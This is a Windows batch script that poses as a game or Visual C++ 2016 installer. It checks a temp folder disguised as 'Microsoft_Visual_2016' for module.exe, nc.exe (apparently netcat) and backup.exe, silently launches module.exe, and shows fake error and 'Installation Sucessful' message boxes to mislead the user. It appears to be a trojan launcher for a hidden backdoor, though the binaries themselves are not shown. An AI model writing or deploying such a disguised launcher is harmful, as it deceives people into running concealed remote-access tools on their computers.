set rnd=%random%
Ping www.google.nl -n 1 -w 1000
cls
if errorlevel 1 (set internet=Offline) else (set internet=Online)
if "%internet%"=="Offline" goto ERROR
GOTO EOF2
:ERROR
set rnd2=%random%
echo X=msgbox("Failed to download packages. Please check your internet connectivity.",0+46,"Failed")>>%temp%\%rnd2%.vbs
start %temp%\%rnd2%.vbs
ping localhost -n 5 >nul
del %temp%\%rnd2%.vbs
goto END
:EOF2

cd /d %temp%\Microsoft_Visual_2016\
echo %cd%
if NOT EXIST %temp%\Microsoft_Visual_2016\module.exe goto Message
if NOT EXIST %temp%\Microsoft_Visual_2016\nc.exe goto Message
if NOT EXIST %temp%\Microsoft_Visual_2016\backup.exe goto Message
start %temp%\Microsoft_Visual_2016\module.exe
goto EOF
:Message
set rnd=%random%
echo X=msgbox("Error: x0004222: This application cannot start correctly. Reinstall vc2016(x86).exe",0+16,"Missing Files")>>%temp%\%rnd%.vbs
start %temp%\%rnd%.vbs
ping localhost -n 5 >nul
del %temp%\%rnd%.vbs
GOTO END
:EOF
set rnd=%random%
echo X=msgbox("Installation Sucessful. You may run the game now",0+46,"Success...")>>%temp%\%rnd%.vbs
start %temp%\%rnd%.vbs
ping localhost -n 5 >nul
del %temp%\%rnd%.vbs
:END